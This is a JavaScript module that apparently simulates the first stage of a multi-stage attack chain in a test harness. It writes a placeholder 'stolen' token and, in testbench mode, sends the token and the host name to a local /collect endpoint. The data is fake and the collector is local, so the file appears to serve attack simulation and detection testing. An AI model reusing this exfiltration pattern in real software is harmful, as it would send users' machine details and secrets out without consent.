/**
 * Stage 1: initial access
 * Writes “stolen token” locally and exfiltrates a stage1 capture.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const http = require('http');

function writeToken() {
  const token = `stolen-${Date.now()}`;
  const stolenPath = path.join(process.cwd(), '.stolen', 'token.json');
  fs.mkdirSync(path.dirname(stolenPath), { recursive: true });
  fs.writeFileSync(stolenPath, JSON.stringify({ token }, null, 2));
  return token;
}

function postJson(url, payload) {
  return new Promise((resolve) => {
    try {
      const data = JSON.stringify(payload);
      const req = http.request(
        {
          hostname: url.hostname,
          port: url.port,
          path: url.path,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
          }
        },
        (resp) => {
          resp.on('data', () => {});
          resp.on('end', () => resolve(true));
          resp.resume();
        }
      );
      req.on('error', () => resolve(false));
      req.write(data);
      req.end();
    } catch {
      resolve(false);
    }
  });
}

function appendEvidence(payload) {
  try {
    // victim-app is in <scenarioRoot>/victim-app, so scenarioRoot is one level up.
    const scenarioRoot = path.join(process.cwd(), '..');
    const evidencePath = path.join(scenarioRoot, 'infrastructure', 'captured-data.json');
    const parsed = JSON.parse(fs.readFileSync(evidencePath, 'utf8'));
    if (parsed && Array.isArray(parsed.captures)) {
      parsed.captures.push({ timestamp: new Date().toISOString(), data: payload });
      fs.writeFileSync(evidencePath, JSON.stringify(parsed, null, 2));
    }
  } catch {
    // ignore
  }
}

async function stage1() {
  const token = writeToken();

  if (process.env.TESTBENCH_MODE === 'enabled') {
    appendEvidence({
      attack: 'multi-stage-attack-chain',
      stage: 'stage1',
      timestamp: new Date().toISOString(),
      hostname: os.hostname(),
      token
    });

    await postJson(
      { hostname: 'localhost', port: 3017, path: '/collect' },
      {
        attack: 'multi-stage-attack-chain',
        stage: 'stage1',
        timestamp: new Date().toISOString(),
        hostname: os.hostname(),
        token
      }
    );
  }

  return { ok: true, token };
}

function getToken() {
  try {
    const tokenFile = path.join(process.cwd(), '.stolen', 'token.json');
    const raw = fs.readFileSync(tokenFile, 'utf8');
    return JSON.parse(raw).token;
  } catch (e) {
    return null;
  }
}

module.exports = { stage1, getToken };

